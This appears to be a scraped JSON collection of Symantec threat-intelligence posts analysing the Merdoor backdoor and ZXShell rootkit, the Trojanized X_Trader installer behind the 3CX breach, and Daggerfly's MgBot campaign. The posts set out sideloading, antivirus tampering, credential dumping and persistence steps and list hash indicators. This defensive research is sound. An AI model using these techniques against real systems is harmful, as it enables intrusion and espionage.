65c91e22f5ce3133af93b69d8ce43de6b6ccac98fc8841fd485d74d30c2dbe7b - Meterpreter 8041b82b8d0a4b93327bc8f0b71672b0e8f300dc7849d78bb2d72e2e0f147334 - Meterpreter 8b2cf6af49fc3fb1f33e94ad02bd9e43c3c62ba2cfd25ff3dfc7a29dde2b20f2 - Meterpreter 97378d58815a1b87f07beefb24b40c5fb57f8cce649136ff57990b957aa9d56a – Meterpreter c33e56318e574c97521d14d68d24b882ffb0ed65d96203970b482d8b2c332351 - Meterpreter 9b8adde838c8ea2479b444ed0bb8c53b7e01e7460934a6f2e797de58c3a6a8bf - Possible Meterpreter 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd - Exfiltration tool ca6abfa37f92f45e1a69161f5686f719aaa95d82ad953d6201b0531fb07f0937 - Possible exfiltration tool bdfac069017d9126b1ad661febfab7eb1b8e70af1186a93cb4aff93911183f24 - Sliver The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/buhti-ransomware"
  },
  {
    "title": "lancefly merdoor zxshell custom backdoor",
    "content": "The Lancefly advanced persistent threat (APT) group is using a custom-written backdoor in attacks targeting organizations in South and Southeast Asia, in activity that has been ongoing for several years. Lancefly may have some links to previously known groups, but these are low confidence, which led researchers at Symantec, byBroadcom Software, to classify this activity under a new group name. Lancefly’s custom malware, which we have dubbed Merdoor, is a powerful backdoor that appears to have existed since 2018. Symantec researchers observed it being used in some activity in 2020 and 2021, as well as this more recent campaign, which continued into the first quarter of 2023. The motivation behind both these campaigns is believed to be intelligence gathering. The backdoor is used very selectively, appearing on just a handful of networks and a small number of machines over the years, with its use appearing to be highly targeted. The attackers in this campaign also have access to an updated version of the ZXShell rootkit. The targets in this most recent activity, which began in mid-2022 and continued into 2023, are based in South and Southeast Asia, in sectors including government, aviation, education, and telecoms. Symantec researchers previously saw the Merdoor backdoor used in activity that targeted victims in the same geographies in the government, communications, and technology sectors in 2020 into 2021. Like this recent activity, that activity also appeared to be highly targeted, with only a small number of machines infected. Merdoor is a fully-featured backdoor that appears to have been in existence since 2018. The backdoor contains the following functionality: Instances of the Merdoor backdoor are usually identical with the exception of embedded and encrypted configuration, which determines: Typically, the backdoor is injected into the legitimate processes perfhost.exe or svchost.exe. The Merdoor dropper is a self-extracting RAR (SFX) that contains three files: When opened, the dropper extracts embedded files and executes a legitimate binary in order to load the Merdoor loader. Merdoor dropper variants have been found that abuse older versions of five different legitimate applications for the purpose of DLL sideloading: Evidence from Lancefly’s earlier campaign that began in 2020 suggested that in that instance the group may have used a phishing email with a lure based on the 37th ASEAN Summit as an initial infection vector. In this more recent activity, the initial infection vector was not entirely clear. We saw some indications of what the initial infection vector may have been in two victims, though this was not conclusive. While evidence for any of these infection vectors is not definitive, it does appear to indicate that Lancefly is adaptable when it comes to the kind of infection vectors it uses. Credential theft using non-malware techniques In activity that also aligned with their earlier campaign in 2020/2021, the attackers used a number of non-malware techniques for credential theft on victim machines: The attackers also used a masqueraded version of the legitimate archiving tool WinRAR to stage and encrypt files before exfiltration. Notable attack chain tools and TTPs A typical Merdoor attack chain, as seen in one of the victims, appears to be: The ZXShell rootkit wasfirst reported on by Cisco in 2014, but the version of the tool used by Lancefly is updated, indicating that it continues to be actively developed. The source code of this rootkit is publicly available so it may be used by multiple different groups. The new version of the rootkit used by Lancefly appears to be smaller in size, while it also has additional functions and targets additional antivirus software to disable. The loader for the rootkit is a 32-bit DLL with the export directory name \"FormDll.dll\" (SHA256: 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7).It has the following exports: Whenever the export \"LoadSys\" is executed, it drops one of the following files based on the processor architecture: These files are a malicious Windows Kernel driver. This is a variant of a driver that wasfirst documented in an RSAblog several years ago. It has the PDB filename: \"c:\\google\\objchk_win7_amd64\\amd64\\Google.pdb\" The sample creates the device: \"\\Device\\TdiProxy0\". It also creates the symbolic link \"\\DosDevices\\TdiProxy0\", so that it can be controlled using the pathname “\\\\.\\TdiProxy0”. After this, the loader timestamps the dropped file by copying the timestamps from the file \"[WindowsDirectory]\\system32\\drivers\\http.sys\". Then it creates a service with the following parameters: \"CallDriver\" opens the following device, which was created by the“\\\\.\\TdiProxy0”malicious kernel driver. It communicates with it using theDeviceIoControlAPI. The export expects two arguments. The first argument determines the dwIoControlCode parameter to use when calling theDeviceIoControlAPI and it should be one of the following strings: Any other values result in what looks like a buggy dwIoControlCode value. The second argument is a string to pass as an lpInBuffer parameter when calling theDeviceIoControlAPI, after conversion using theMultiByteToWideCharAPI. Whenever the export \"DoRVA\" is executed, it reads the following file: The file should start with the magic string \"AP32\" and contains shellcode to execute in compressed form. Export \"KillAvpProcess\" This enumerates running processes and for selected processes and calls its own export \"CallDriver\" with the following parameters: The export expects a single string parameter to compare with the executable file of running processes for selection. Export \"ProtectDllFile\" This calls its own export \"CallDriver\" with the following parameters: Next, it sets the following registry value: This is a 32-bit executable with the PDB filename: \"M:\\Project\\database\\10.0.18362\\Form\\Release\\Form.pdb\". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e) Whenever the sample is executed, it loads the following DLL: It also calls its export: \"DoRVA\". Installation and Update Utility The installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset. Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data: Next, it checks that: If both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. For example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\". Next, it attempts to rename the file \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.dat\" as one of the following (depending on the Windows version): Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form. The sample then decompresses the renamed file \"temp.temp\". When decompressing, it may create the temporary file \"temp.temp.pack\" in the same folder. Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: Then the sample checks if the following file exists: If so, the sample renames the updated \"temp.temp\" file to replace it.Otherwise, it checks the following registry value for the pathname to replace: If that fails, it uses a default from configuration data. Finally, it checks the following registry value for a service name: It restarts the referred service. Installation functionality The sample attempts to decompress the following file: Then it may modify one of the following registry values to hijack the corresponding service: Next, it starts the corresponding service and then removes the registry value. It then attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. It then creates a service with the following parameters: Then it creates the following registry value: It then deletes the following registry values: Next, it renames the following file: Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form (using aPLib for compression). The sample then decompresses the renamed \"[PER CONFIGURATION DATA].back\" as \"[PER CONFIGURATION DATA]\". Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: Finally, when the configuration data includes the option \"OneSelfKey\", it makes a compressed copy of its own executable as (using aPLib for compression): Some samples include an embedded archive with the final payload: This is a variant of the ZXShell backdoor (SHA256: d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849). The ZXShell rootkit used by Lancefly is signed by the certificate \"Wemade Entertainment Co. Ltd\", which was previously reported to be associated with APT41 (aka Blackfly/Grayfly). However, it is known that Chinese APT groups, such as APT41,often share certificateswith other APT groups. The ZXShell backdoor has also previously been used by the HiddenLynx/APT17 group, but as the source code of ZXShell is now publicly available this does not provide a definitive link between these two groups. Also notable is that the ZXShell rootkit loader component has the name \"formdll.dll\" and it has the ability to read the file \"Form.hlp\" and execute its contents as shellcode. Those same files were mentioned as being used in a previous reportdetailing activity by the Iron Tiger (aka Budworm/APT27) group. In that case, the attackers used these filenames when loading the PlugX backdoor onto victim machines. The prevalence of such files is very low, which may indicate a potential link between that campaign and this more recent activity. PlugX is also seen being used by Lancefly. PlugX is a remote access Trojan (RAT) with multiple functionalities including backdoor access and data exfiltration. PlugX has existed for well over a decade. It was originally used by Chinese APT groups, but its use is now very widespread, meaning it is difficult to use it as a way of attributing activity. ShadowPad is also used by these attackers. ShadowPad is a modular RAT believed to be exclusively used by Chinese APT groups. Its capabilities are similar to PlugX, and it is often referred to as a successor to that malware. While these overlaps and shared tools may indicate some links between Lancefly activity and activity by other APT groups, none of the overlaps are strong enough to attribute this activity and the development of the Merdoor backdoor to an already-known attack group. This recent Lancefly activity is of note due to its use of the Merdoor backdoor, but also the low prevalence of this backdoor and the seemingly highly targeted nature of these attacks. While the Merdoor backdoor appears to have been in existence for several years, it appears to only have been used in a small number of attacks in that time period. This prudent use of the tool may indicate a desire by Lancefly to keep its activity under the radar. The tools used and sectors targeted all point to the motivations of this attack campaign being intelligence gathering. The similarities between this recent activity and earlier activity by Lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two. Whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen. For the latest protection updates, please visit theSymantec Protection Bulletin. SHA256FilenameDescription 13df2d19f6d2719beeff3b882df1d3c9131a292cf097b27a0ffca5f45e139581 – a.exe – Merdoor Dropper 8f64c25ba85f8b77cfba3701bebde119f610afef6d9a5965a3ed51a4a4b9dead – chrome_frame_helper.exe – Merdoor Dropper 8e98eed2ec14621feda75e07379650c05ce509113ea8d949b7367ce00fc7cd38 – siteadv.exe – Merdoor Dropper 89e503c2db245a3db713661d491807aab3d7621c6aff00766bc6add892411ddc – siteadv.exe – Merdoor Dropper c840e3cae2d280ff0b36eec2bf86ad35051906e484904136f0e478aa423d7744 –siteadv.exe –Merdoor Dropper 5f16633dbf4e6ccf0b1d844b8ddfd56258dd6a2d1e4fb4641e2aa508d12a5075 –chrome_frame_helper.dll – Merdoor Loader ff4c2a91a97859de316b434c8d0cd5a31acb82be8c62b2df6e78c47f85e57740 –chrome_frame_helper.dll – Merdoor Loader 14edb3de511a6dc896181d3a1bc87d1b5c443e6aea9eeae70dbca042a426fcf3 –chrome_frame_helper.dll – Merdoor Loader db5deded638829654fc1595327400ed2379c4a43e171870cfc0b5f015fad3a03 –chrome_frame_helper.dll – Merdoor Loader e244d1ef975fcebb529f0590acf4e7a0a91e7958722a9f2f5c5c05a23dda1d2c –chrome_frame_helper.dll – Merdoor Loader f76e001a7ccf30af0706c9639ad3522fd8344ffbdf324307d8e82c5d52d350f2 –chrome_frame_helper.dll – Merdoor Loader dc182a0f39c5bb1c3a7ae259f06f338bb3d51a03e5b42903854cdc51d06fced6 – smadhook64c.dll – Merdoor Loader fa5f32457d0ac4ec0a7e69464b57144c257a55e6367ff9410cf7d77ac5b20949 – SiteAdv.dll, chrome_frame_helper.dll –Merdoor Loader fe7a6954e18feddeeb6fcdaaa8ac9248c8185703c2505d7f249b03d8d8897104 – siteadv.dll – Merdoor Loader 341d8274cc1c53191458c8bbc746f428856295f86a61ab96c56cd97ee8736200 – siteadv.dll – Merdoor Loader f3478ccd0e417f0dc3ba1d7d448be8725193a1e69f884a36a8c97006bf0aa0f4 – siteadv.dll – Merdoor Loader 750b541a5f43b0332ac32ec04329156157bf920f6a992113a140baab15fa4bd3 – mojo_core.dll – Merdoor Loader 9f00cee1360a2035133e5b4568e890642eb556edd7c2e2f5600cf6e0bdcd5774 – libmupdf.dll – Merdoor Loader a9051dc5e6c06a8904bd8c82cdd6e6bd300994544af2eed72fe82df5f3336fc0 – chrome_frame_helper.dll – Merdoor Loader d62596889938442c34f9132c9587d1f35329925e011465c48c94aa4657c056c7 – smadhook64c.dll – Merdoor Loader f0003e08c34f4f419c3304a2f87f10c514c2ade2c90a830b12fdf31d81b0af57 – SiteAdv.pak – Merdoor encoded payload 139c39e0dc8f8f4eb9b25b20669b4f30ffcbe2197e3a9f69d0043107d06a2cb4 – SiteAdv.pak – Merdoor encoded payload 11bb47cb7e51f5b7c42ce26cbff25c2728fa1163420f308a8b2045103978caf5 – SiteAdv.pak – Merdoor encoded payload 0abc1d12ef612490e37eedb1dd1833450b383349f13ddd3380b45f7aaabc8a75 – SiteAdv.pak – Merdoor encoded payload eb3b4e82ddfdb118d700a853587c9589c93879f62f576e104a62bdaa5a338d7b –SiteAdv.exe – Legit McAfee executable 1ab4f52ff4e4f3aa992a77d0d36d52e796999d6fc1a109b9ae092a5d7492b7dd – chrome_frame_helper.exe – Legit Google executable fae713e25b667f1c42ebbea239f7b1e13ba5dc99b225251a82e65608b3710be7 – SmadavProtect64.exe – Legit SmadAV executable File hashes, simplified list 13df2d19f6d2719beeff3b882df1d3c9131a292cf097b27a0ffca5f45e139581 8f64c25ba85f8b77cfba3701bebde119f610afef6d9a5965a3ed51a4a4b9dead 8e98eed2ec14621feda75e07379650c05ce509113ea8d949b7367ce00fc7cd38 89e503c2db245a3db713661d491807aab3d7621c6aff00766bc6add892411ddc c840e3cae2d280ff0b36eec2bf86ad35051906e484904136f0e478aa423d7744 5f16633dbf4e6ccf0b1d844b8ddfd56258dd6a2d1e4fb4641e2aa508d12a5075 ff4c2a91a97859de316b434c8d0cd5a31acb82be8c62b2df6e78c47f85e57740 14edb3de511a6dc896181d3a1bc87d1b5c443e6aea9eeae70dbca042a426fcf3 db5deded638829654fc1595327400ed2379c4a43e171870cfc0b5f015fad3a03 e244d1ef975fcebb529f0590acf4e7a0a91e7958722a9f2f5c5c05a23dda1d2c f76e001a7ccf30af0706c9639ad3522fd8344ffbdf324307d8e82c5d52d350f2 dc182a0f39c5bb1c3a7ae259f06f338bb3d51a03e5b42903854cdc51d06fced6 fa5f32457d0ac4ec0a7e69464b57144c257a55e6367ff9410cf7d77ac5b20949 fe7a6954e18feddeeb6fcdaaa8ac9248c8185703c2505d7f249b03d8d8897104 341d8274cc1c53191458c8bbc746f428856295f86a61ab96c56cd97ee8736200 f3478ccd0e417f0dc3ba1d7d448be8725193a1e69f884a36a8c97006bf0aa0f4 750b541a5f43b0332ac32ec04329156157bf920f6a992113a140baab15fa4bd3 9f00cee1360a2035133e5b4568e890642eb556edd7c2e2f5600cf6e0bdcd5774 a9051dc5e6c06a8904bd8c82cdd6e6bd300994544af2eed72fe82df5f3336fc0 d62596889938442c34f9132c9587d1f35329925e011465c48c94aa4657c056c7 f0003e08c34f4f419c3304a2f87f10c514c2ade2c90a830b12fdf31d81b0af57 139c39e0dc8f8f4eb9b25b20669b4f30ffcbe2197e3a9f69d0043107d06a2cb4 11bb47cb7e51f5b7c42ce26cbff25c2728fa1163420f308a8b2045103978caf5 0abc1d12ef612490e37eedb1dd1833450b383349f13ddd3380b45f7aaabc8a75 eb3b4e82ddfdb118d700a853587c9589c93879f62f576e104a62bdaa5a338d7b 1ab4f52ff4e4f3aa992a77d0d36d52e796999d6fc1a109b9ae092a5d7492b7dd fae713e25b667f1c42ebbea239f7b1e13ba5dc99b225251a82e65608b3710be7 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221 592e237925243cf65d30a0c95c91733db593da64c96281b70917a038da9156ae 929b771eabef5aa9e3fba8b6249a8796146a3a4febfd4e992d99327e533f9798 009d8d1594e9c8bc40a95590287f373776a62dad213963662da8c859a10ef3b4 ef08f376128b7afcd7912f67e2a90513626e2081fe9f93146983eb913c50c3a8 ee486e93f091a7ef98ee7e19562838565f3358caeff8f7d99c29a7e8c0286b28 32d837a4a32618cc9fc1386f0f74ecf526b16b6d9ab6c5f90fb5158012fe2f8c d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849 a1f9b76ddfdafc47d4a63a04313c577c0c2ffc6202083422b52a00803fd8193d 3ce38a2fc896b75c2f605c135297c4e0cddc9d93fc5b53fe0b92360781b5b94e 210934a2cc59e1f5af39aa5a18aae1d8c5da95d1a8f34c9cfc3ab42ecd37ac92 530c7d705d426ed61c6be85a3b2b49fd7b839e27f3af60eb16c5616827a2a436 5018fe25b7eac7dd7bc30c7747820e3c1649b537f11dbaa9ce6b788b361133bf efa9e9e5da6fba14cb60cba5dbd3f180cb8f2bd153ca78bbacd03c270aefd894 a5a4dacddfc07ec9051fb7914a19f65c58aad44bbd3740d7b2b995262bd0c09e 10b96290a17511ee7a772fcc254077f62a8045753129d73f0804f3da577d2793 0dcfcdf92e85191de192b4478aba039cb1e1041b1ae7764555307e257aa566a7 415f9dc11fe242b7a548be09a51a42a4b5c0f9bc5c32aeffe7a98940b9c7fc04 947f7355aa6068ae38df876b2847d99a6ca458d67652e3f1486b6233db336088 8d77fe4370c864167c1a712d0cc8fe124b10bd9d157ea59db58b42dea5007b63 d8cc2dc0a96126d71ed1fce73017d5b7c91465ccd4cdcff71712381af788c16d e94a5bd23da1c6b4b8aec43314d4e5346178abe0584a43fa4a204f4a3f7464b9 5655a2981fa4821fe09c997c84839c16d582d65243c782f45e14c96a977c594e 19ec3f16a42ae58ab6feddc66d7eeecf91d7c61a0ac9cdc231da479088486169 41d174514ed71267aaff578340ff83ef00dbb07cb644d2b1302a18aa1ca5d2d0 67ebc03e4fbf1854a403ea1a3c6d9b19fd9dc2ae24c7048aafbbff76f1bea675 f92cac1121271c2e55b34d4e493cb64cdb0d4626ee30dc77016eb7021bf63414 859e76b6cda203e84a7b234c5cba169a7a02bf028a5b75e2ca8f1a35c4884065 fcdec9d9b195b8ed827fb46f1530502816fe6a04b1f5e740fda2b126df2d9fd5 9584df964369c1141f9fc234c64253d8baeb9d7e3739b157db5f3607292787f2 711a347708e6d94da01e4ee3b6cdb9bcc96ebd8d95f35a14e1b67def2271b2e9 f040a173b954cdeadede3203a2021093b0458ed23727f849fc4c2676c67e25db 90edb2c7c3ba86fecc90e80ac339a42bd89fbaa3f07d96d68835725b2e9de3ba b0d25b06e59b4cca93e40992fa0c0f36576364fcf1aca99160fd2a1faa5677a2 4c55f48b37f3e4b83b6757109b6ee0a661876b41428345239007882993127397 3e1c8d982b1257471ab1660b40112adf54f762c570091496b8623b0082840e9f 9830f6abec64b276c9f327cf7c6817ad474b66ea61e4adcb8f914b324da46627 79ae300ac4f1bc7636fe44ce2faa7e5556493f7013fc5c0a3863f28df86a2060 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/lancefly-merdoor-zxshell-custom-backdoor"
  },
  {
    "title": "xtrader 3cx supply chain",
    "content": "The X_Trader software supply chain attack affected more organizations than 3CX. Initial investigation by Symantec’s Threat Hunter Team has, to date, found that among the victims are two critical infrastructure organizations in the energy sector, one in the U.S. and the other in Europe. In addition to this, two other organizations involved in financial trading were also breached. As reported yesterday by Mandiant, Trojanized X_Trader software was the cause of the 3CX breach, which was uncovered last month. As a result of this breach,3CX’s software was compromised, with many customers inadvertently downloading malicious versions of the company’s voice and video calling software DesktopApp.In addition to wider victims, Symantec has also discovered additional indicators of compromise, listed below. It appears likely that the X_Trader supply chain attack is financially motivated, since Trading Technologies, the developer of X_Trader, facilitates futures trading, including energy futures. Nevertheless, the compromise of critical infrastructure targets is a source of concern. North Korean-sponsored actors are known to engage in both espionage and financially motivated attacks and it cannot be ruled out that strategically important organizations breached during a financial campaign are targeted for further exploitation. The infection chain starts with the Trojanized installer named X_TRADER_r7.17.90p608.exe (SHA256: 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), which is digitally signed by \"Trading Technologies International, Inc.\" and contains a malicious executable named Setup.exe. Our analysis of one version of this executable (SHA256: aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43) found that when executed, it examined the file named X_TRADER-ja.mst (also contained in the installer) for the following marker bytes at hardcoded offset 0x167000: If the marker bytes are present, it creates a folder named: It then copies the file C:\\Windows\\Sysnative\\immersivetpmvscmgrsvr.exe as C:\\Programdata\\TPM\\TpmVscMgrSvr.exe to the new folder. Next, it will drop two malicious DLLs: The content of the dropped files is generated by decrypting chunks of the file X_TRADER-ja.mst mentioned earlier using the XOR algorithm with the following key: To achieve persistence on the victim’s system, the malware invokes a CLSID_TaskScheduler COM object, possibly to create a scheduled task to run periodically the following file: Setup.exe then drops a file named X_TRADER.exe, also contained within the installer. The content of the dropped file is generated by decrypting chunks from one of its own portable executable resources starting at hardcoded offset 0x1CB40 using the XOR algorithm with the following key: Setup will then execute X_Trader.exe before deleting itself. Once installed, the legitimate X_Trader executable side-loads the two malicious DLLs dropped by the installer. The first, winscard.dll, acts as a loader and contains code that will load and execute a payload from the second (msvcr100.dll). The msvcr100.dll file contains an encrypted blob appended to the file. The blob starts with the hex value FEEDFACE, which the loader uses to find the blob. The process for payload installation is almost identical as that seen with the Trojanized 3CX app, where two side-loaded DLLs are used to extract a payload from an encrypted blob. In this attack, the payload extracted is a modular backdoor called Veiledsignal (SHA256: e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345). Veiledsignal contains another DLL (SHA256: 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), which is a process-injection module. This can be injected into the Chrome, Firefox, or Edge web browsers. The module contains a second DLL (SHA256: f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), which is a command-and-control (C&C) module. It connects to the following C&C URL: The discovery that 3CX was breached by another, earlier supply chain attack made it highly likely that further organizations would be impacted by this campaign, which now transpires to be far more wide-ranging than originally believed. The attackers behind these breaches clearly have a successful template for software supply chain attacks and further, similar attacks cannot be ruled out. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6 - Trojanized installer (X_TRADER_r7.17.90p608.exe) 6e989462acf2321ff671eaf91b4e3933b77dab6ab51cd1403a7fe056bf4763ba – Possible Trojanized installer aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43 - Malicious component of Trojanized installer (setup.exe) 6e11c02485ddd5a3798bf0f77206f2be37487ba04d3119e2d5ce12501178b378 - Malicious component of Trojanized installer (setup.exe) 47a8e3b20405a23f7634fa296f148cab39a7f5f84248c6afcfabf5201374d1d1 - Benign Windows executable used for side-loading (tpmvscmgrsvr.exe) cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2 – Veiledsignal loader (winscard.dll) 277119738f4bdafa1cde9790ec82ce1e46e04cebf6c43c0e100246f681ba184e – Veiledsignal loader (devobj.dll) cb374af8990c5f47b627596c74e2308fbf39ba33d08d862a2bea46631409539f – Malicious DLL (msvcr100.dll) d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0 – Malicious DLL (msvcr100.dll) e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345 - Veiledsignal main component 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae - Veiledsignal process-injection module f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce - Veiledsignal communications module https://www.tradingtechnologies[.]com/trading/order-management - Veiledsignal C&C server \\\\.\\pipe\\gecko.nativeMessaging.in.foo8bc16e6288f2a -Veiledsignal named pipe Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40 - Veiledsignal user agent The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/xtrader-3cx-supply-chain"
  },
  {
    "title": "apt attacks telecoms africa mgbot",
    "content": "A telecommunications organization in Africa appears to be among the latest targets for the Daggerfly (aka Evasive Panda, Bronze Highland) advanced persistent threat (APT) group, with the group’s most recent campaign using previously unseen plugins from the MgBot malware framework. The first indications of malicious activity on this victim’s network were seen in November 2022, but there are indications the activity is likely still ongoing. Researchers from the Threat Hunter Team at Symantec, byBroadcom Software, found multiple unique plugins associated with the MgBot modular malware framework on the victim’s network. The attackers were also seen using a PlugX loader and abusing the legitimate AnyDesk remote desktop software. Use of the MgBot modular malware framework and PlugX loader have been associated in the past with China-linked APTs. Association between this activity and Daggerfly is based in part on detailsin a 2020 blog about activity that Malwarebytes attributed to Evasive Panda. Crossovers in the activity included: The folders and file names used in this recent activity, as well as the use of DLL side-loading, also support the attribution. The activity documented by Malwarebytes occurred in 2020, and Daggerfly is believed to have been active since at least 2014. Suspicious AnyDesk connections spotted on a Microsoft Exchange mail server in November 2022 were among the first signs of suspicious activity on the victim network targeted in this recent Daggerfly activity. AnyDesk is a legitimate remote desktop software but it is commonly abused by threat actors for remote access and other purposes. The WannaMine crypto-mining malware was also seen on the same Exchange server, though it appears likely that this activity was not linked to the Daggerfly group. The presence of WannaMine, however, does indicate that the server it was found on may have been unpatched and vulnerable to the EternalBlue exploit, as well as more recent exploits targeting this web server. The legitimate, free Rising antivirus software was also used to side-load the PlugX loader onto victim machines. We will go through the attack chain in further detail below. Threat actors used the living-off-the-land tools BITSAdmin and PowerShell to download files onto victim systems. The attackers downloaded the legitimate AnyDesk executable and the GetCredManCreds tool in this way. The attackers used the previously downloaded GetCredManCreds script to retrieve the usernames and passwords of web services stored in the credential manager using PowerShell. They also dumped the SAM (Security Account Manager), System, and Security hives of the Windows registry using the reg.exe tool. This allowed the adversaries to extract credentials from the SAM database. Persistence with local account Daggerfly also created a local account to maintain access to victim systems with the following command line: MgBot modular malware framework MgBot is a well-designed modular framework that is actively maintained. The components of the framework are the following: The MgBot plugins that were deployed in this activity have numerous capabilities that can provide the attackers with a significant amount of information about compromised machines. Among the unique plugins that were deployed during this activity were: All of these capabilities would have allowed the attackers to collect a significant amount of information from victim machines. The capabilities of these plugins also show that the main goal of the attackers during this campaign was information-gathering. Daggerfly’s development of these previously unseen plugins demonstrates that the attack group is continuing to actively develop its malware and the tools it can use to target victim networks. Telecoms companies will always be a key target in intelligence gathering campaigns due to the access they can potentially provide to the communications of end-users. Symantec’s Threat Hunter team also spotted some other recent activity targeting telecoms companies that was linked with moderate confidence to the threat actor Othorene (aka Gallium), in what appeared to be a continuation of an intelligence-gathering campaign first reported on bySentinelOne under the name Operation Tainted Love in March. SentinelOne reported that in that campaign Othorene was targeting telecoms companies in the Middle East. Othorene has been active since around 2014, and it is believed to be a relatively small group that has a strong focus on the surveillance of individuals. There are some indications that Othorene may have links with the APT41 (aka Blackfly, Grayfly) APT group also. Overlap of both personnel and tactics, techniques, and procedures (TTPs) among Chinese APT groups is not uncommon, and can mean that attributing activity to one group with high confidence is difficult. In the activity Symantec saw, we found three additional victims of the same campaign that SentinelOne detailed, located in Asia and Africa. Two of the three were subsidiaries of the same Middle Eastern telecoms firm. The attackers had been active on victim networks since November 2022. Symantec saw attackers dumping credentials and scanning the network using NbtScan. The main malware (pc.exe dubbed mim221) in this campaign was used to dump credentials, and it had the same password as the malware used in the activity documented by SentinelOne. The attackers also moved laterally across victims’ networks, used Scheduled Task for persistence, and dumped SAM and System hives from the registry. There were indications that the attackers may have exported the Active Directory database on victim machines, and they were also able to gain access to domain controllers, giving them deep access to victim networks. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. File Indicators – Daggerfly c89316e87c5761e0fc50db1214beb32a08c73d2cad9df8c678c8e44ed66c1dab 90e15eaf6385b41fcbf021ecbd8d86b8c31ba48c2c5c3d1edb8851896f4f72fe MgBot – aasrvd.dll, pmsrvd.dll 706c9030c2fa5eb758fa2113df3a7e79257808b3e79e46869d1bf279ed488c36 017187a1b6d58c69d90d81055db031f1a7569a3b95743679b21e44ea82cfb6c7 cb8aede4ad660adc1c78a513e7d5724cac8073bea9d6a77cf3b04b019395979a 2dcf9e556332da2a17a44dfceda5e2421c88168aafea73e2811d65e9521c715c a6ed16244a5b965f0e0b84b21dcc6f51ad1e413dc2ad243a6f5853cd9ac8da0b ee6a3331c6b8f3f955def71a6c7c97bf86ddf4ce3e75a63ea4e9cd6e20701024 585db6ab2f7b452091ddb29de519485027665335afcdb34957ff1425ecc3ec4b 29df6c3f7d13b259b3bc5d56f2cdd14782021fc5f9597a3ccece51ffac2010a0 ea2be3d0217a2efeb06c93e32f489a457bdea154fb4a900f26bef83e2053f4fd 54198678b98c2094e74159d7456dd74d12ab4244e1d9376d8f4d864f6237cd79 d9eec27bf827669cf13bfdb7be3fdb0fdf05a26d5b74adecaf2f0a48105ae934 cb7d9feda7d8ebfba93ec428d5a8a4382bf58e5a70e4b51eb1938d2691d5d4a5 2c0cfe2f4f1e7539b4700e1205411ec084cbc574f9e4710ecd4733fbf0f8a7dc a16a70b0a1ac0718149a31c780edb126379a0d375d9f6007a6def3141bec6810 0bcdcc0515d30c28017fd7931b8a787feebe9ee3819aa2b758ce915b8ba40f99 PlugX Loader –proccom.dll, djcu.dll c31b409b1fe9b6387b03f7aedeafd3721b4ec6d6011da671df49e241394da154 db489e9760da2ed362476c4e0e9ddd6e275a84391542a6966dbcda0261b3f30a 